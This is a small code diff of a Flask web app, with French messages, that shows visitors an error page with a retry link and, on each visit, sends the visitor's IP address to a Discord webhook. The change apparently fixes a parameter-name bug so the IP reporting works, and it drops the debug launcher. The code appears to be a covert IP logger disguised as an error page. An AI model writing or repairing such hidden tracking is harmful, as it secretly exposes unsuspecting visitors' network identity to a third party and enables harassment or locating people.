@@ -14,7 +14,7 @@ def index():
     send_to_discord_webhook(user_ip)
     return render_template('index.html', error_message=error_message, retry_url=retry_url)
 
-def send_to_discord_webhook(ip_address):
+def send_to_discord_webhook(user_ip):
     payload = {
         'content': f"Adresse IP de l'utilisateur : {user_ip}"
     }
@@ -27,5 +27,3 @@ def send_to_discord_webhook(ip_address):
     except Exception as e:
         print(f"Erreur lors de l'envoi de l'adresse IP au webhook Discord : {str(e)}")
 
-if __name__ == '__main__':
-    app.run(debug=True)
